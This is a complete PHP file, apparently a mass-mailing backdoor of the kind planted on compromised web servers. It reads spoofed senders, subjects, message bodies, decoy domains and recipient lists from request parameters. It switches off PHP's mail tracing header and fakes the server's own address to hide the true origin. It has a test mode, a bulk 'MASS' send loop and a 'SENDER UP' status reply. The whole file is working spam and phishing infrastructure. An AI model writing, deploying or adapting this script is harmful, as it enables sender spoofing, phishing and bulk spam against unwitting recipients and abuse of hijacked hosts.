<?php
ini_set('mail.add_x_header','off');
$_testmail = $_REQUEST['TESTMAIL'];
$_testlink = $_REQUEST['TESTLINK'];
$_status = $_REQUEST['STATUS'];
$_snames = $_REQUEST['SNAMES'];
$_semails = $_REQUEST['SEMAILS'];
$_message = $_REQUEST['MESSAGE'];
$_subjects = $_REQUEST['SUBJECTS'];
$_ctype = $_REQUEST['CTYPE'];
$_spamdom = $_REQUEST['SPAMDOM'];
$_mlr = $_REQUEST['MAILER'];

$_SERVER['PHP_SELF'] = "/email.php"; 
$_SERVER['REMOTE_ADDR'] = $_SERVER['SERVER_ADDR']; 

$SpamDom = explode(",", $_spamdom);
$Snames = explode(",", $_snames);
$Semails = explode(",", $_semails);
$Subjects = explode(",", $_subjects);

$rnx = chr(rand(97,122)) . chr(rand(97,122)) . chr(rand(97,122)) . rand(100,999);
$rnx.= chr(rand(97,122)) . chr(rand(97,122)) . chr(rand(97,122)) . rand(100,999);
$rnx.= "." . $SpamDom[array_rand($SpamDom)];

$smail = stripslashes($Semails[array_rand($Semails)]);
$_rmessage = str_replace("XXRANDOMXX", $rnx, $_message);
$_message = str_replace("\n", "\r\n", $_rmessage);
$_from = stripslashes($Semails[array_rand($Semails)]);
$_subject = $Subjects[array_rand($Subjects)];

$_ctype = stripslashes($_ctype);
$message  = urlencode($_message);
$message  = ereg_replace("%5C%22", "%22", $message);
$message  = urldecode($message);
$_message  = stripslashes($message);
$_subject  = stripslashes($_subject);

$headers   = array();
$headers[] = "MIME-Version: 1.0";
$headers[] = "Content-type: $_ctype; charset=iso-8859-1";
$headers[] = "From: $_from";
$headers[] = "Reply-To: $smail";
$headers[] = "X-Mailer: $_mlr ".phpversion();

if($_status == "CHECK") {
        if($_testmail == NULL) return 0;
        if($_from == NULL) return 0;
        if($_message == NULL) return 0;
        if($_subject == NULL) return 0;

        $_subject = $_subject . " " . $_testlink;

        mail($_testmail, $_subject, $_message, implode("\r\n", $headers));
        print "$_testmail\n\n$_message\n\n$_from\n\n$_subject";
}
elseif($_status == "MASS") {
        $_maillist = $_REQUEST['MAILLIST'];
        $emails = explode(",", $_maillist);

        if($_from == NULL) return 0;
        if($_message == NULL) return 0;
        if($_subject == NULL) return 0;

        foreach($emails as $email) {
                if($email == NULL) $email = $_testmail;
                mail($email, $_subject, $_message, implode("\r\n", $headers));
                print "$email - SENT\r\n";
        }
}
else {
        print "SENDER UP";
}
?>


